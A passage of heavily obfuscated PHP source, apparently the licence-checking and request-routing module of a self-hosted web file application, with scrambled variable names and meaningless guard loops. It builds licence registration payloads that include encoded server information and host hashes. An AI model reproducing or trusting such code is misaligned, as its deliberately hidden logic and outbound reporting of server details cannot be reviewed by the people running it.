$¥Ä‹º‡Ô = $_SERVER[ĞÆÏ¡Îª][631]; if (!$¥Ä‹º‡Ô) { return; } } } private function uwtg0ba873a5() { $ï‰‹œ™ =& $_SERVER[ĞÆÏ¡Îª]; $ÓÕ¬ËÆò =& $_SERVER[û†ìªƒĞ]; $†¬ùÓ…… = $ÓÕ¬ËÆò[4]; $ôÜŒ—« = $ï‰‹œ™[632]; if (strlen($ôÜŒ—«) < $ï‰‹œ™[243]) { return; } $Ÿ§ÕîÃ = $GLOBALS[$ÓÕ¬ËÆò[13]][$ÓÕ¬ËÆò[14]][0]; if (!$Ÿ§ÕîÃ || strlen($Ÿ§ÕîÃ) <= strlen($†¬ùÓ……)) { return; } if (strtolower(substr($Ÿ§ÕîÃ, -strlen($†¬ùÓ……))) != $†¬ùÓ……) { return; } $ŠÒºÈº­ = substr($Ÿ§ÕîÃ, 0, -strlen($†¬ùÓ……)); $ãüË„°€ = array($ÓÕ¬ËÆò[4], $ŠÒºÈº­); $é‚ÇÙóŸ = $ï‰‹œ™[633]; $¿Ë‡ÅÉ¬ = array_slice($GLOBALS[$ÓÕ¬ËÆò[13]][$ÓÕ¬ËÆò[14]], 1); $’»£³ŞÄ = $ï‰‹œ™[634]; if (strlen($’»£³ŞÄ) < $ï‰‹œ™[635]) { return; } $GLOBALS[$ÓÕ¬ËÆò[13]][$ÓÕ¬ËÆò[14]] = array_merge($ãüË„°€, $¿Ë‡ÅÉ¬); $GLOBALS[$ÓÕ¬ËÆò[13]][$ÓÕ¬ËÆò[15]] = implode($ÓÕ¬ËÆò[0], $GLOBALS[$ÓÕ¬ËÆò[13]][$ÓÕ¬ËÆò[14]]); $±¬òÛ»Â = $ï‰‹œ™[636]; if (!$±¬òÛ»Â) { die; } } private function oxznbd723c20() { $µ¨äİŞô =& $_SERVER[ĞÆÏ¡Îª]; $·›ŠÜÎÒ =& $_SERVER[û†ìªƒĞ]; if ($GLOBALS[$·›ŠÜÎÒ[13]][$·›ŠÜÎÒ[15]] != $·›ŠÜÎÒ[6]) { return; } $“©Ò£ÏĞ = $_SERVER[$·›ŠÜÎÒ[16]]; $ÅãÍ¥‰± = $µ¨äİŞô[637]; if (!$ÅãÍ¥‰±) { die; } $¯éªÊªÃ = $·›ŠÜÎÒ[17]; $×îŞ«É = $µ¨äİŞô[638]; if (strlen($×îŞ«É) < $µ¨äİŞô[639]) { die; } if (!strstr($“©Ò£ÏĞ, $¯éªÊªÃ)) { return; } $¶şó´×Ÿ = strrpos($“©Ò£ÏĞ, $¯éªÊªÃ); $‡Àê«Ã‰ = $µ¨äİŞô[640]; $ğ›ş¦ãƒ = substr($“©Ò£ÏĞ, $¶şó´×Ÿ + strlen($¯éªÊªÃ)); preg_match_all($·›ŠÜÎÒ[18], $ğ›ş¦ãƒ, $²™Æ¸¥); $±Ì«åİ = $µ¨äİŞô[641]; if (strlen($±Ì«åİ) < $µ¨äİŞô[243]) { return; } $ğ›ş¦ãƒ = trim($²™Æ¸¥[0][0], $·›ŠÜÎÒ[19]); $GLOBALS[$·›ŠÜÎÒ[13]][$·›ŠÜÎÒ[14]] = explode($·›ŠÜÎÒ[19], $ğ›ş¦ãƒ); $GLOBALS[$·›ŠÜÎÒ[13]][$·›ŠÜÎÒ[15]] = implode($·›ŠÜÎÒ[0], $GLOBALS[$·›ŠÜÎÒ[13]][$·›ŠÜÎÒ[14]]); $ï‚Ê“¿ = $µ¨äİŞô[642]; while (strlen($ï‚Ê“¿) < $µ¨äİŞô[635]) { if (!$ï‚Ê“¿) { break; } $ï‚Ê“¿++; } } public function run() { $€íÒ­µÕ =& $_SERVER[ĞÆÏ¡Îª]; $î¹ØÄÏ =& $_SERVER[û†ìªƒĞ]; $this->oxznbd723c20(); $ÍÂ¾‹ï = $€íÒ­µÕ[643]; if (strlen($ÍÂ¾‹ï) < $€íÒ­µÕ[624]) { die; } $this->uwtg0ba873a5(); $ÜÕ˜‘š = $GLOBALS[$î¹ØÄÏ[13]][$î¹ØÄÏ[14]]; $¥ıÕ°©ú = $GLOBALS[$î¹ØÄÏ[13]][$î¹ØÄÏ[15]]; $ìÃ°¨çù = $€íÒ­µÕ[644]; if (!$ìÃ°¨çù) { return; } define($î¹ØÄÏ[20], isset($ÜÕ˜‘š[0]) && $ÜÕ˜‘š[0] ? $ÜÕ˜‘š[0] : $this->defaultModule); define($î¹ØÄÏ[21], isset($ÜÕ˜‘š[1]) && $ÜÕ˜‘š[0] ? $ÜÕ˜‘š[1] : $this->defaultController); define($î¹ØÄÏ[22], isset($ÜÕ˜‘š[2]) && $ÜÕ˜‘š[0] ? $ÜÕ˜‘š[2] : $this->defaultAction); define($î¹ØÄÏ[23], MOD . $î¹ØÄÏ[0] . ST . $î¹ØÄÏ[0] . ACT); $_SERVER[$î¹ØÄÏ[24]] = strtolower(ACTION); $³öúÅå« = $€íÒ­µÕ[645]; if (!$³öúÅå«) { return; } $this->autorun(); $„„±Â³Ú = $€íÒ­µÕ[646]; if (!$„„±Â³Ú) { return; } if (count($ÜÕ˜‘š) >= 3) { $this->appRun($¥ıÕ°©ú); } else { $this->appRun(ACTION); } } private $jetvdec1f191 = array(); private $yzmb90bab883 = ''; public function xawi94ed8faa() { $šü±«üÀ =& $_SERVER[ĞÆÏ¡Îª]; $ñÚœÔ =& $_SERVER[û†ìªƒĞ]; $this->opce52ceb17a(); $this->ftkb4db4fa6c(); $§ã“şîÙ = $šü±«üÀ[647]; while (strlen($§ã“şîÙ) < $šü±«üÀ[624]) { if (!$§ã“şîÙ) { break; } $§ã“şîÙ++; } $this->abiwf8972a27(); $this->czwv82085e58(); $this->dcar462a4c76(); $this->mtsi00a10fca(); $í€’½ªê = $šü±«üÀ[648]; if (strlen($í€’½ªê) < $šü±«üÀ[635]) { die; } $this->bpzj02a2dfdd(); $this->giuz0be82f61($ñÚœÔ[25], array($this, $ñÚœÔ[26])); $Û’î–Ğµ = $šü±«üÀ[649]; while ($Û’î–Ğµ < $šü±«üÀ[650]) { if ($Û’î–Ğµ >= 0) { break; } $Û’î–Ğµ++; } $this->giuz0be82f61($ñÚœÔ[27], array($this, $ñÚœÔ[28])); $this->giuz0be82f61($ñÚœÔ[29], array($this, $ñÚœÔ[30])); $this->giuz0be82f61($ñÚœÔ[31], array($this, $ñÚœÔ[32])); } public function grebe0ea5c4f($­æ‘ûÎì) { $ÆïŠĞî³ =& $_SERVER[ĞÆÏ¡Îª]; $É¨ğÈæ½ =& $_SERVER[û†ìªƒĞ]; $áığãğ = Model($É¨ğÈæ½[33])->get(); $ªÓìë¿® = array($É¨ğÈæ½[34], $É¨ğÈæ½[35], $É¨ğÈæ½[36], $É¨ğÈæ½[37], $É¨ğÈæ½[38], $É¨ğÈæ½[39], $É¨ğÈæ½[40], $É¨ğÈæ½[41], $É¨ğÈæ½[42], $É¨ğÈæ½[43], $É¨ğÈæ½[44], $É¨ğÈæ½[45], $É¨ğÈæ½[46], $É¨ğÈæ½[47], $É¨ğÈæ½[48], $É¨ğÈæ½[49], $É¨ğÈæ½[50], $É¨ğÈæ½[51], $É¨ğÈæ½[52], $É¨ğÈæ½[53], $É¨ğÈæ½[54], $É¨ğÈæ½[55], $É¨ğÈæ½[56], $É¨ğÈæ½[57], $É¨ğÈæ½[58], $É¨ğÈæ½[59], $É¨ğÈæ½[60], $É¨ğÈæ½[61], $É¨ğÈæ½[62], $É¨ğÈæ½[63], $É¨ğÈæ½[64], $É¨ğÈæ½[65], $É¨ğÈæ½[66], $É¨ğÈæ½[67], $É¨ğÈæ½[68], $É¨ğÈæ½[69], $É¨ğÈæ½[70], $É¨ğÈæ½[71], $É¨ğÈæ½[72], $É¨ğÈæ½[73], $É¨ğÈæ½[74], $É¨ğÈæ½[75], $É¨ğÈæ½[76], $É¨ğÈæ½[77], $É¨ğÈæ½[78], $É¨ğÈæ½[79], $É¨ğÈæ½[80], $É¨ğÈæ½[81], $É¨ğÈæ½[82], $É¨ğÈæ½[83]); $“’¯®ô = $ÆïŠĞî³[651]; if (strlen($“’¯®ô) < $ÆïŠĞî³[635]) { die; } foreach ($ªÓìë¿® as $àƒ‡éíñ) { $‚÷·Ê‰— = $GLOBALS[$É¨ğÈæ½[84]][$É¨ğÈæ½[85]][$àƒ‡éíñ]; if (isset($áığãğ[$àƒ‡éíñ])) { $‚÷·Ê‰— = $áığãğ[$àƒ‡éíñ]; } $­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$àƒ‡éíñ] = $‚÷·Ê‰—; } $æ‹®ï… = $­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$É¨ğÈæ½[46]]; $ò†¹±öÎ = $ÆïŠĞî³[652]; while ($ò†¹±öÎ < $ÆïŠĞî³[650]) { if ($ò†¹±öÎ >= 0) { break; } $ò†¹±öÎ++; } unset($­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[88]][$É¨ğÈæ½[89]]); unset($­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[88]][$É¨ğÈæ½[90]]); $†ó­—» = $ÆïŠĞî³[653]; unset($­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$É¨ğÈæ½[46]]); unset($­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$É¨ğÈæ½[91]]); $ÍÍµ¿—é = $ÆïŠĞî³[654]; while (strlen($ÍÍµ¿—é) < $ÆïŠĞî³[635]) { if (!$ÍÍµ¿—é) { break; } $ÍÍµ¿—é++; } $­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$É¨ğÈæ½[92]] = array($É¨ğÈæ½[93] => (int) $æ‹®ï…[$É¨ğÈæ½[94]], $É¨ğÈæ½[95] => (int) _get($æ‹®ï…, $É¨ğÈæ½[96], 0)); $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[98]] = Action($É¨ğÈæ½[99])->accessToken(); $®ÓåıÁ = $ÆïŠĞî³[655]; if (strlen($®ÓåıÁ) < $ÆïŠĞî³[624]) { die; } $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[100]] = md5($_SERVER[$É¨ğÈæ½[101]] . $áığãğ[$É¨ğÈæ½[102]]); $Êâ®Çê = $ÆïŠĞî³[656]; $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[103]] = base64_encode(serverInfo()); $ÍÒÕë„Ş = $ÆïŠĞî³[657]; $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[104]] = $this->yzmb90bab883; if ($áığãğ[$É¨ğÈæ½[104]] != $É¨ğÈæ½[105]) { $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[106]] = $áığãğ[$É¨ğÈæ½[106]]; $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[107]] = $áığãğ[$É¨ğÈæ½[107]]; $æÉ¾áÅØ = rand_string(10) . $this->yzmb90bab883 . rand_string(5); $­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[108]][$É¨ğÈæ½[109]] = $this->iavz9e61462e($æÉ¾áÅØ, $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[100]]); } if ($this->yzmb90bab883 == $É¨ğÈæ½[105]) { $­æ‘ûÎì[$É¨ğÈæ½[86]][$É¨ğÈæ½[87]][$É¨ğÈæ½[92]][$É¨ğÈæ½[96]] = 0; } $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[110]] = _get($this->jetvdec1f191, $É¨ğÈæ½[111], $É¨ğÈæ½[6]); $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[112]] = _get($this->jetvdec1f191, $É¨ğÈæ½[113], $É¨ğÈæ½[6]); $ì”ƒ¦Ü¡ = $ÆïŠĞî³[658]; if (_get($GLOBALS, $É¨ğÈæ½[114]) && $this->config[$É¨ğÈæ½[115]]) { $­æ‘ûÎì[$É¨ğÈæ½[97]][$É¨ğÈæ½[116]] = WEB_ROOT; } return $­æ‘ûÎì; } private function mtsi00a10fca() { $ËÀ¤´øÖ =& $_SERVER[ĞÆÏ¡Îª]; $ÓË²°À =& $_SERVER[û†ìªƒĞ]; $¼´€Å”à = $_SERVER[$ÓË²°À[24]] == $ÓË²°À[117]; if ($_SERVER[$ÓË²°À[24]] == $ÓË²°À[118] && $_GET[$ÓË²°À[119]] == $ÓË²°À[120]) { $¼´€Å”à = !0; } if ($¼´€Å”à) { $ÎïòĞƒ™ = array($ÓË²°À[104] => $this->yzmb90bab883, $ÓË²°À[121] => $this->bximaa41e628(), $ÓË²°À[122] => Model($ÓË²°À[123])->count()); if ($this->yzmb90bab883 != $ÓË²°À[105]) { $òØÚ€º¤ = _get($this->jetvdec1f191, $ÓË²°À[124]); if ($òØÚ€º¤) { $ÎïòĞƒ™[$ÓË²°À[125]] = $òØÚ€º¤; $ÎïòĞƒ™[$ÓË²°À[126]] = strtotime(_get($this->jetvdec1f191, $ÓË²°À[127])); $ÎïòĞƒ™[$ÓË²°À[128]] = _get($this->jetvdec1f191, $ÓË²°À[113]); } $Ş©î‘“š = Model($ÓË²°À[33])->get($ÓË²°À[129], $ÓË²°À[6], !0); if (is_string($Ş©î‘“š) && substr($Ş©î‘“š, 0, 1) == $ÓË²°À[130]) { $Ş©î‘“š = json_decode_force($Ş©î‘“š); } if (is_array($Ş©î‘“š) && $Ş©î‘“š[$ÓË²°À[131]] && strstr($Ş©î‘“š[$ÓË²°À[131]], $ÓË²°À[132])) { $½˜íÉƒø = explode($ÓË²°À[132], $Ş©î‘“š[$ÓË²°À[131]]); $ÎïòĞƒ™[$ÓË²°À[133]] = $½˜íÉƒø[0]; } } $ÎïòĞƒ™ = $this->dxrmc9a9bf8f(json_encode($ÎïòĞƒ™), md5($ÓË²°À[134])); $¹êØçŠ“ = array($ÓË²°À[135] => $ÎïòĞƒ™); $²›„úèş = $ËÀ¤´øÖ[659]; if (!$²›„úèş) { return; } call_user_func(array($ÓË²°À[136], $ÓË²°À[137]), $¹êØçŠ“); $ü¦Ş„Š÷ = $ËÀ¤´øÖ[660]; while (strlen($ü¦Ş„Š÷) < $ËÀ¤´øÖ[650]) { if (!$ü¦Ş„Š÷) { break; } $ü¦Ş„Š÷++; } } if ($this->yzmb90bab883 == $ÓË²°À[105]) { return; } $‹Šş¡¡ = array($ÓË²°À[138], $ÓË²°À[139], $ÓË²°À[140], $ÓË²°À[141], $ÓË²°À[142], $ÓË²°À[143]); $¨şû»«ª = Model($ÓË²°À[33])->get(); $úõÅÜÜµ = $ËÀ¤´øÖ[661]; while ($úõÅÜÜµ < $ËÀ¤´øÖ[624]) { if ($úõÅÜÜµ >= 0) { break; } $úõÅÜÜµ++; } $¹êØçŠ“ = array($ÓË²°À[144] => $¨şû»«ª[$ÓË²°À[34]], $ÓË²°À[145] => $¨şû»«ª[$ÓË²°À[35]], $ÓË²°À[146] => $ÓË²°À[6]); foreach ($‹Šş¡¡ as $±ù¸Î¨) { if (!isset($¨şû»«ª[$±ù¸Î¨]) || !$¨şû»«ª[$±ù¸Î¨]) { continue; } $¹êØçŠ“[$±ù¸Î¨] = $¨şû»«ª[$±ù¸Î¨]; $ç‚ƒšàê = $ËÀ¤´øÖ[662]; if (!$ç‚ƒšàê) { return; } } call_user_func(array($ÓË²°À[136], $ÓË²°À[137]), $¹êØçŠ“); $²ÑşšºÍ = $ËÀ¤´øÖ[663]; if (!$²ÑşšºÍ) { return; } } private function czwv82085e58() { $£°çµ¶Ç =& $_SERVER[ĞÆÏ¡Îª]; $¿Ôà“»’ =& $_SERVER[û†ìªƒĞ]; if ($_SERVER[$¿Ôà“»’[24]] != $¿Ôà“»’[147]) { return; } if (!_get($GLOBALS, $¿Ôà“»’[114])) { die; } $—¿ÌØÆ¹ = $GLOBALS[$¿Ôà“»’[13]]; if (isset($—¿ÌØÆ¹[$¿Ôà“»’[148]])) { $this->zrkvc6ad4077(); die; } if (!isset($—¿ÌØÆ¹[$¿Ôà“»’[149]]) || strlen($—¿ÌØÆ¹[$¿Ôà“»’[149]]) != 16) { show_json($¿Ôà“»’[150] . $—¿ÌØÆ¹[$¿Ôà“»’[149]], !1); } $ÉÒõª“ì = Model($¿Ôà“»’[33])->get($¿Ôà“»’[102]); $µ¹¦’ù = md5($_SERVER[$¿Ôà“»’[101]] . $ÉÒõª“ì); $Ì¥å¤şš = $£°çµ¶Ç[664]; if (!$Ì¥å¤şš) { return; } $è–¥°¹ê = array($¿Ôà“»’[149] => $—¿ÌØÆ¹[$¿Ôà“»’[149]], $¿Ôà“»’[151] => rand_string(16), $¿Ôà“»’[152] => $¿Ôà“»’[134], $¿Ôà“»’[153] => $¿Ôà“»’[154], $¿Ôà“»’[155] => $_SERVER[$¿Ôà“»’[156]], $¿Ôà“»’[157] => $_SERVER[$¿Ôà“»’[158]], $¿Ôà“»’[159] => $_SERVER[$¿Ôà“»’[160]], $¿Ôà“»’[100] => $µ¹¦’ù, $¿Ôà“»’[161] => Model($¿Ôà“»’[33])->get($¿Ôà“»’[129])); $±Ç×«Ñ¯ = $£°çµ¶Ç[665]; if (strlen($±Ç×«Ñ¯) < $£°çµ¶Ç[635]) { return; } if ($—¿ÌØÆ¹[$¿Ôà“»’[162]] == $¿Ôà“»’[163]) { $ÜùÁ½ÎË = $this->dxrmc9a9bf8f($µ¹¦’ù, $¿Ôà“»’[164]); $Ã÷½®Û = $this->iavz9e61462e(json_encode($è–¥°¹ê), $µ¹¦’ù . $¿Ôà“»’[165], 3); $Ã÷½®Û = $Ã÷½®Û . $¿Ôà“»’[166] . $_SERVER[$¿Ôà“»’[156]]; $‡³‹ëØÈ = $this->vfbk24f5d9ff($¿Ôà“»’[167] . $ÜùÁ½ÎË . $¿Ôà“»’[168] . $Ã÷½®Û, -1); show_json($‡³‹ëØÈ, !0); } else { if ($—¿ÌØÆ¹[$¿Ôà“»’[162]] == $¿Ôà“»’[169]) { $µ§¹ˆù = substr(md5($¿Ôà“»’[170] . $µ¹¦’ù), 12, 15) . $¿Ôà“»’[171]; $Ã÷½®Û = $this->ukxs7d7c3b47(trim($—¿ÌØÆ¹[$¿Ôà“»’[172]]), $µ§¹ˆù, 2); $ûºÂÇ× = json_decode($Ã÷½®Û, !0); if (!is_array($ûºÂÇ×) || !is_array($ûºÂÇ×[$¿Ôà“»’[173]]) || $ûºÂÇ×[$¿Ôà“»’[149]] != !0) { $ŞĞÖµå£ = $¿Ôà“»’[174]; $äÕÒš£„ = $ûºÂÇ×[$¿Ôà“»’[173]] ? $¿Ôà“»’[175] . $ûºÂÇ×[$¿Ôà“»’[173]] : $ŞĞÖµå£; show_json($äÕÒš£„, !1); } else { $è–¥°¹ê[$¿Ôà“»’[151]] = $ûºÂÇ×[$¿Ôà“»’[173]][$¿Ôà“»’[176]]; } } else { $ûºÂÇ× = $this->vfbk24f5d9ff($¿Ôà“»’[177], $è–¥°¹ê, 10); } } if (!is_array($ûºÂÇ×) || !is_array($ûºÂÇ×[$¿Ôà“»’[173]]) || $ûºÂÇ×[$¿Ôà“»’[149]] != !0) { $ŞĞÖµå£ = LNG($¿Ôà“»’[178]); $äÕÒš£„ = $ûºÂÇ×[$¿Ôà“»’[173]] ? $¿Ôà“»’[175] . $ûºÂÇ×[$¿Ôà“»’[173]] : $ŞĞÖµå£; show_json($äÕÒš£„, !1); } $†Ö´ÀŸ× = $ûºÂÇ×[$¿Ôà“»’[173]]; $Â›È™è– = $this->sbur11e4271c($†Ö´ÀŸ×[$¿Ôà“»’[179]]); if (!$Â›È™è– || $Â›È™è– != $†Ö´ÀŸ×[$¿Ôà“»’[127]]) { $äÈ‚ğ› = array($¿Ôà“»’[180] => Model($¿Ôà“»’[33])->get($¿Ôà“»’[102]), $¿Ôà“»’[181] => $_SERVER[$¿Ôà“»’[101]], $¿Ôà“»’[182] => this_url(), $¿Ôà“»’[157] => $_SERVER[$¿Ôà“»’[158]]); $Ã÷½®Û = $this->dkioe1ccaf26(json_encode($äÈ‚ğ›)); $this->vfbk24f5d9ff($¿Ôà“»’[183] . $Ã÷½®Û); show_json(LNG($¿Ôà“»’[184]), !0); } $µ„öíŞ = array($¿Ôà“»’[185] => $†Ö´ÀŸ×[$¿Ôà“»’[186]], $¿Ôà“»’[187] => $†Ö´ÀŸ×[$¿Ôà“»’[188]], $¿Ôà“»’[189] => rand_string(16), $¿Ôà“»’[104] => $†Ö´ÀŸ×[$¿Ôà“»’[190]]); if ($è–¥°¹ê[$¿Ôà“»’[151]]) { $µ„öíŞ[$¿Ôà“»’[189]] = $è–¥°¹ê[$¿Ôà“»’[151]]; } $¥ì®ö±ˆ = substr(md5($µ„öíŞ[$¿Ôà“»’[187]]), 10, 10); $Ì–Ş¸Œ“ = $¥ì®ö±ˆ . $µ„öíŞ[$¿Ôà“»’[104]] . $µ„öíŞ[$¿Ôà“»’[189]]; $µ„öíŞ[$¿Ôà“»’[106]] = strrev(base64_encode($this->dxrmc9a9bf8f($Ì–Ş¸Œ“, $¿Ôà“»’[191]))); $Ø­à´µ¥ = $£°çµ¶Ç[666]; if (strlen($Ø­à´µ¥) < $£°çµ¶Ç[639]) { die; } $ğæÆšß = rand_string(16); $…¼¼¹Î = $ğæÆšß . $µ„öíŞ[$¿Ôà“»’[104]] . $this->dxrmc9a9bf8f(md5($µ„öíŞ[$¿Ôà“»’[185]]), $ğæÆšß); $µ„öíŞ[$¿Ôà“»’[107]] = base64_encode(strrev($this->dxrmc9a9bf8f($…¼¼¹Î, $¿Ôà“»’[192]))); $Å€Õî¿º = $£°çµ¶Ç[667]; if (!$Å€Õî¿º) { return; } if ($†Ö´ÀŸ×[$¿Ôà“»’[193]] && $†Ö´ÀŸ×[$¿Ôà“»’[193]] >= 1) { Model($¿Ôà“»’[33])->setDeep($¿Ôà“»’[194], $¿Ôà“»’[120]); } Model($¿Ôà“»’[33])->set($µ„öíŞ); $±é°„Ù½ = md5($_SERVER[$¿Ôà“»’[101]] . strrev($ÉÒõª“ì) . $µ„öíŞ[$¿Ôà“»’[187]]); $£İü»““ = strrev(substr($±é°„Ù½, 10, 16)); $Ú›¡¡Ú´ = $£°çµ¶Ç[668]; $«‚âı¸Ş = $this->iavz9e61462e(json_encode($†Ö´ÀŸ×), $±é°„Ù½); $…ßÙî™í = $£°çµ¶Ç[669]; if (!$…ßÙî™í) { return; } $É‚¤¶®» = array_to_keyvalue(Model($¿Ôà“»’[7])->listData(), $¿Ôà“»’[195]); $˜Á€Ú»÷ = $É‚¤¶®»[$¿Ôà“»’[196]]; $ßš…ÏÎµ = $£°çµ¶Ç[670]; $¹¼ŠÍÃ› = array(); $Ó˜ıèâ× = $£°çµ¶Ç[671]; while ($Ó˜ıèâ× < $£°çµ¶Ç[243]) { if ($Ó˜ıèâ× >= 0) { break; } $Ó˜ıèâ×++; } $¹¼ŠÍÃ›[$£İü»““] = $«‚âı¸Ş; Model($¿Ôà“»’[7])->update($˜Á€Ú»÷[$¿Ôà“»’[197]], array($¿Ôà“»’[198] => $¹¼ŠÍÃ›)); $this->jetvdec1f191 = $†Ö´ÀŸ×; $ñöÆ°¶ = $£°çµ¶Ç[672]; $this->yzmb90bab883 = $µ„öíŞ[$¿Ôà“»’[104]]; $«ç÷Ë£› = $£°çµ¶Ç[673]; if (!$«ç÷Ë£›) { return; } $this->licenseRegistSuccess(); $ßÚª­º = $£°çµ¶Ç[674]; while (strlen($ßÚª­º) < $£°çµ¶Ç[243]) { if (!$ßÚª­º) { break; } $ßÚª­º++; } Cache::set($¿Ôà“»’[199] . md5($ÉÒõª“ì . $¿Ôà“»’[200]), $¿Ôà“»’[6]); show_json(LNG($¿Ôà“»’[184]), !0); } private function licenseRegistSuccess() { $óõõÙâĞ =& $_SERVER[û†ìªƒĞ]; $ÑÖ·ä‚Ä = Model($óõõÙâĞ[33])->get(); if ($ÑÖ·ä‚Ä[$óõõÙâĞ[63]] != $óõõÙâĞ[120]) { Model($óõõÙâĞ[33])->set($óõõÙâĞ[63], $óõõÙâĞ[120]); } Action($óõõÙâĞ[201])->initStart(!0); } private function zrkvc6ad4077() { $Ÿ²¨í°‡ =& $_SERVER[ĞÆÏ¡Îª]; $à¥¬ì’ñ =& $_SERVER[û†ìªƒĞ]; Model($à¥¬ì’ñ[33])->set(array($à¥¬ì’ñ[185] => $à¥¬ì’ñ[6], $à¥¬ì’ñ[187] => $à¥¬ì’ñ[6], $à¥¬ì’ñ[104] => $à¥¬ì’ñ[105], $à¥¬ì’ñ[106] => $à¥¬ì’ñ[6], $à¥¬ì’ñ[107] => $à¥¬ì’ñ[6])); $©îıÈº = $Ÿ²¨í°‡[675]; if (strlen($©îıÈº) < $Ÿ²¨í°‡[243]) { return; } Model($à¥¬ì’ñ[33])->setDeep($à¥¬ì’ñ[194], $à¥¬ì’ñ[202]); $Ú’µôâÊ = $Ÿ²¨í°‡[676]; if (strlen($Ú’µôâÊ) < $Ÿ²¨í°‡[650]) { return; } $this->jetvdec1f191 = array(); $this->yzmb90bab883 = $à¥¬ì’ñ[105]; $İò«ã… = $Ÿ²¨í°‡[677]; while (strlen($İò«ã…) < $Ÿ²¨í°‡[624]) { if (!$İò«ã…) { break; } $İò«ã…++; } } private function opce52ceb17a() { $àîÀòØ =& $_SERVER[ĞÆÏ¡Îª]; $õµ²Ïªî =& $_SERVER[û†ìªƒĞ]; $_SERVER[$õµ²Ïªî[158]] = _get($_SERVER, $õµ²Ïªî[158], APP_HOST); $this->yzmb90bab883 = $õµ²Ïªî[105]; $„°º°š = Model($õµ²Ïªî[33])->get(); if ($„°º°š[$õµ²Ïªî[104]] == $õµ²Ïªî[105]) { return; } $­ˆ‹’“ë = Model($õµ²Ïªî[33])->get($õµ²Ïªî[102]); $Å£‘ç¤ = $àîÀòØ[678]; if (strlen($Å£‘ç¤) < $àîÀòØ[650]) { die; } $Œ‡öÁ­Õ = $õµ²Ïªî[199] . md5($­ˆ‹’“ë . $õµ²Ïªî[200]); $°¾¿áİ¡ = $àîÀòØ[679]; if (!$°¾¿áİ¡) { return; } $§šıÊ´¡ = Cache::get($Œ‡öÁ­Õ); if (!is_array($§šıÊ´¡) || !isset($§šıÊ´¡[$õµ²Ïªî[203]]) || time() - $§šıÊ´¡[$õµ²Ïªî[203]] >= 60) { $ÑşºıÉ = Model($õµ²Ïªî[7])->loadList(); $À¤ÆŠ¦© = $ÑşºıÉ[$õµ²Ïªî[196]]; $Òó»ĞÛĞ = md5($_SERVER[$õµ²Ïªî[101]] . strrev($­ˆ‹’“ë) . $„°º°š[$õµ²Ïªî[187]]); $Â¶û¢ Ä = strrev(substr($Òó»ĞÛĞ, 10, 16)); $§šıÊ´¡ = $this->ukxs7d7c3b47($À¤ÆŠ¦©[$õµ²Ïªî[84]][$Â¶û¢ Ä], $Òó»ĞÛĞ); $§šıÊ´¡ = json_decode($§šıÊ´¡, !0); } if (!is_array($§šıÊ´¡)) { return $this->zrkvc6ad4077(); } $µœÑ¸ÕÜ = strtotime($§šıÊ´¡[$õµ²Ïªî[127]]); if (time() >= $µœÑ¸ÕÜ) { return $this->zrkvc6ad4077(); } if (time() - $§šıÊ´¡[$õµ²Ïªî[203]] > 20) { $§šıÊ´¡[$õµ²Ïªî[203]] = time(); Cache::set($Œ‡öÁ­Õ, $§šıÊ´¡); } $this->jetvdec1f191 = $§šıÊ´¡; $this->yzmb90bab883 = $„°º°š[$õµ²Ïªî[104]]; $¬õ¦ï£ = $àîÀòØ[680]; if (strlen($¬õ¦ï£) < $àîÀòØ[624]) { die; } } private function ftkb4db4fa6c() { $Ôõ–Ğ¦„ =& $_SERVER[ĞÆÏ¡Îª]; $Öçù„ŸÒ =& $_SERVER[û†ìªƒĞ]; $×İÄ­ÇÛ = $GLOBALS[$Öçù„ŸÒ[13]]; $ªˆ•é„‰ = $Ôõ–Ğ¦„[681]; while ($ªˆ•é„‰ < $Ôõ–Ğ¦„[243]) { if ($ªˆ•é„‰ >= 0) { break; } $ªˆ•é„‰++; } $Ùşãóì» = $_SERVER[$Öçù„ŸÒ[24]]; $ŞÕ‚èÑ° = $Ôõ–Ğ¦„[682]; if (!$ŞÕ‚èÑ°) { die; } if ($Ùşãóì» == $Öçù„ŸÒ[204] && $this->yzmb90bab883 == $Öçù„ŸÒ[105]) { show_json(LNG($Öçù„ŸÒ[205]), !1, $Öçù„ŸÒ[206]); } $íÍ¡¦ùó = array($Öçù„ŸÒ[207], $Öçù„ŸÒ[208]); if (in_array($Ùşãóì», $íÍ¡¦ùó)) { if ($this->yzmb90bab883 == $Öçù„ŸÒ[105] && isset($×İÄ­ÇÛ[$Öçù„ŸÒ[209]])) { show_json(LNG($Öçù„ŸÒ[205]), !1, $Öçù„ŸÒ[206]); die; } $Ö«Îûßè = $this->bximaa41e628(); if ($Ö«Îûßè != intval($Öçù„ŸÒ[210])) { if ($Ö«Îûßè <= Model($Öçù„ŸÒ[123])->count()) { show_json(LNG($Öçù„ŸÒ[211]), !1, $Öçù„ŸÒ[206]); die; } } } } private function abiwf8972a27() { $‚“Ç»¦Í =& $_SERVER[ĞÆÏ¡Îª]; $ ‹”Ò™ =& $_SERVER[û†ìªƒĞ]; $çøõ•‘ = array($ ‹”Ò™[117], $ ‹”Ò™[118]); if (!_get($GLOBALS, $ ‹”Ò™[114]) || !isset($_GET[$ ‹”Ò™[212]])) { return; } if (!in_array($_SERVER[$ ‹”Ò™[24]], $çøõ•‘)) { return; } $†ø²‰€É = $ ‹”Ò™[213]; $á›âş‹ = $‚“Ç»¦Í[683]; while (strlen($á›âş‹) < $‚“Ç»¦Í[639]) { if (!$á›âş‹) { break; } $á›âş‹++; } $†ø²‰€É 